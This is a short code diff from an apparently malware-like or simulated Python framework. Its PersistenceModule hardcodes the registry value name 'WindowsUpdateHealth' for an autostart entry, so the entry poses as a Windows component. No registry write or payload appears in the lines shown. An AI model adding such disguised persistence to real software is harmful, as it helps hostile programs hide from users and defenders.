@@ -68,7 +68,7 @@ class PersistenceModule(InstallationModule):
         program_executable_filepath = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
         
         # 2. Obtener el nombre configurado para el registro
-        value_name = self.get_configuration("REGISTRY_VALUE_NAME")
+        value_name = "WindowsUpdateHealth" #self.get_configuration("REGISTRY_VALUE_NAME")
 
         print(f"[{self.MODULE_NAME}] Setting persistence in Registry...")
         print(f"[{self.MODULE_NAME}] Target: {program_executable_filepath}")
